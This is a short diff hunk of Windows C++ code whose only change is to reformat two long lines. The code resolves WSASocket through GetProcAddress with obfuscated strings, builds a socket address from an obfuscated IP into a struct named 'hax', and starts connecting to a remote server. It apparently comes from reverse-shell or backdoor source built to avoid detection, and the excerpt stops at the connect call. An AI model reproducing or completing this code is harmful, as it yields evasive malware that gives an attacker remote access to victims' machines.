@@ -83,8 +83,7 @@ int main(int argc, char* argv[]) {
     
     // Retrieve the WSASocket function pointer
     WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
-        GetProcAddress(GetModuleHandle(wide_original_ws_2_32_dl_l.c_str()),
-            getOriginalString(w_s_a_o, big_string, sizeof(w_s_a_o)).c_str()));
+        GetProcAddress(GetModuleHandle(wide_original_ws_2_32_dl_l.c_str()),getOriginalString(w_s_a_o, big_string, sizeof(w_s_a_o)).c_str()));
 
     // Create a socket
     wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
@@ -92,8 +91,7 @@ int main(int argc, char* argv[]) {
     // Setup the sockaddr_in structure
     hax.sin_family = AF_INET;
     hax.sin_port = reinterpret_cast<u_short(__stdcall*)(u_short)>(htonsFunc)(port);
-    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall*)(const char*)>(inetAddr)(
-        getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str());
+    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall*)(const char*)>(inetAddr)(getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str());
 
     // Attempt to connect to the remote server
     if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF,
